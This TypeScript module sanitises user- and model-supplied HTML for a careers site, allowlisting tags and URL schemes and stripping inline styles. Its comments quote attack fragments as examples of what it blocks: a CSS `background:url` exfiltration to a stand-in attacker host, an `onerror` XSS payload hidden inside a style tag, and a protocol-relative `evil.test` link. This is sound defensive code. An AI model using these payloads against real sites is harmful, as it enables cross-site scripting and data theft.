import sanitizeHtml from 'sanitize-html';

/**
 * Sanitiser for recruiter- and user-supplied rich text (job descriptions,
 * company profiles) that is rendered with dangerouslySetInnerHTML.
 *
 * Inline styles are dropped along with every event handler: presentation comes
 * from the surrounding Tailwind typography classes, and a `style` attribute
 * allows silent data exfiltration (`background:url(https://attacker/?...)`)
 * and layout spoofing even though it cannot execute script.
 *
 * Implementation note: this used to run on `isomorphic-dompurify`, which needs
 * a DOM and therefore pulls in jsdom on the server. jsdom's dependency chain
 * ends at an ESM-only module that its CommonJS parent `require()`s, which threw
 * ERR_REQUIRE_ESM under Vercel's serverless loader and took down every
 * server-rendered page — this module is reachable from the root layout via
 * CareerAssistant. `sanitize-html` parses with htmlparser2 instead, so there is
 * no DOM requirement and no ESM in the chain. Verify with:
 *   node --no-experimental-require-module -e "require('sanitize-html')"
 */

const ALLOWED_TAGS = [
  'p', 'br', 'hr', 'div', 'span',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li',
  'strong', 'b', 'em', 'i', 'u', 's',
  'blockquote', 'code', 'pre',
  'a',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
];

/** Absolute, linkable schemes only — blocks javascript:, data: and vbscript:. */
const RICH_TEXT_HREF = /^(?:https?|mailto|tel):/i;

/** As above, but also permits root-relative paths (never protocol-relative). */
const INLINE_HREF = /^(?:https?|mailto|tel):|^\/(?!\/)/i;

/** Drops the href entirely when it does not match the allowlist regex. */
function hrefFilter(pattern: RegExp): sanitizeHtml.Transformer {
  return (tagName, attribs) => {
    const next: Record<string, string> = { ...attribs };
    if (typeof next.href !== 'string' || !pattern.test(next.href.trim())) {
      delete next.href;
    }
    return { tagName, attribs: next };
  };
}

/**
 * Content of these tags is discarded rather than kept as text, so a payload
 * hidden inside them (e.g. `<style><img src=x onerror=...>`) cannot survive as
 * raw text and be re-parsed downstream.
 */
const NON_TEXT_TAGS = ['script', 'style', 'textarea', 'option', 'noscript', 'title'];

export function sanitizeRichText(html: string): string {
  if (!html) return '';
  return sanitizeHtml(html, {
    allowedTags: ALLOWED_TAGS,
    allowedAttributes: {
      '*': ['title'],
      a: ['href', 'title', 'target', 'rel'],
      th: ['colspan', 'rowspan'],
      td: ['colspan', 'rowspan'],
    },
    allowedSchemes: ['http', 'https', 'mailto', 'tel'],
    allowedSchemesAppliedToAttributes: ['href'],
    // `//evil.test` would otherwise inherit the page protocol.
    allowProtocolRelative: false,
    // No inline CSS at all, on any tag.
    allowedStyles: {},
    disallowedTagsMode: 'discard',
    nonTextTags: NON_TEXT_TAGS,
    transformTags: { a: hrefFilter(RICH_TEXT_HREF) },
  });
}

/**
 * Narrow allowlist used for assistant/model output rendered as inline markdown.
 */
export function sanitizeInlineMarkup(html: string): string {
  if (!html) return '';
  return sanitizeHtml(html, {
    allowedTags: ['strong', 'code', 'a', 'b', 'i', 'em'],
    allowedAttributes: {
      '*': ['class'],
      a: ['href', 'class', 'target'],
    },
    allowedSchemes: ['http', 'https', 'mailto', 'tel'],
    allowedSchemesAppliedToAttributes: ['href'],
    allowProtocolRelative: false,
    allowedStyles: {},
    disallowedTagsMode: 'discard',
    nonTextTags: NON_TEXT_TAGS,
    transformTags: { a: hrefFilter(INLINE_HREF) },
  });
}
